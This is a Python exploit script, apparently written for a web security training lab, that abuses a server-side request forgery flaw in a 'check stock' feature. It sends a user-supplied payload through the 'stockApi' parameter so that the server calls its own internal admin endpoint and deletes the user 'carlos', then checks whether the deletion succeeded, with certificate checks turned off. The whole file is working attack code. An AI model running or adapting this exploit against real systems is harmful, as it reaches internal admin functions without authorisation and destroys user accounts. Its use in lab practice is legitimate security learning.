import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def delete_user(url, delete_user_ssrf_payload, check_stock_path):
    params = {'stockApi': delete_user_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params, verify=False)

    # Check if user was deleted
    admin_ssrf_payload = 'http://localhost/admin'
    params2 = {'stockApi': admin_ssrf_payload}
    r = requests.post(url + check_stock_path, data=params2, verify=False)
    if 'User deleted successfully' in r.text:
        print("(+) Successfully deleted Carlos user!")
    else:
        print("(-) Exploit was unsuccessful.")

def main():
    # User input for URL, SSRF payload, and check stock path
    url = input("(+) Enter the target URL (e.g., 'http://www.example.com'): ").strip()
    
    # Validate URL format
    if not url.startswith('http://') and not url.startswith('https://'):
        print("(-) Error: URL must start with 'http://' or 'https://'")
        return

    delete_user_ssrf_payload = input("(+) Enter the SSRF payload for deleting user (e.g., 'http://localhost/admin/delete?username=carlos'): ").strip()
    check_stock_path = input("(+) Enter the check stock path (e.g., '/product/stock'): ").strip()

    print("(+) Deleting Carlos user...")
    delete_user(url, delete_user_ssrf_payload, check_stock_path)

if __name__ == "__main__":
    main()